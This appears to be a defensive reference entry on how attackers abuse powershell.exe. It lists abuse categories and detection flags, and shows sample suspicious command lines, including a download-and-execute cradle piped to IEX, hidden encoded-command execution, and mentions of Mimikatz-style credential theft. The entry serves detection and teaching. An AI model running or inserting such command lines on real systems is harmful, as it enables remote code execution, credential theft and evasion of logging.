# powershell.exe — PowerShell

## Description
PowerShell is a task automation and configuration management framework. It consists of a command-line shell and scripting language. Available natively on all modern Windows systems with deep system access.

## Abused For
- **Remote code execution:** Download cradle and execute payloads in memory
- **Credential access:** Invoke-Mimikatz, Invoke-Kerberoast
- **Lateral movement:** WinRM, PSRemoting, Invoke-Command
- **Fileless malware:** Entirely in-memory execution without touching disk
- **Defense evasion:** Disable logging, bypass execution policies, obfuscate scripts

## Suspicious Usage
```
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand <base64>
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://...')"
powershell.exe -Command "$x=$((Get-WmiObject Win32_Service).Name);IEX $x"
```

## Normal Usage
```
powershell.exe -Command "Get-Service"
powershell.exe -File "C:\Scripts\deploy.ps1"
```

## Detection Flags
- `-EncodedCommand` or `-e` with base64 payload
- `-WindowStyle Hidden` or `-W Hidden` (hiding window)
- `-ExecutionPolicy Bypass` (overriding policy)
- `-NoProfile` (not loading profile)
- Download cradle patterns (WebClient, Invoke-WebRequest, Invoke-RestMethod)
- Pipeline to `IEX` (Invoke-Expression)
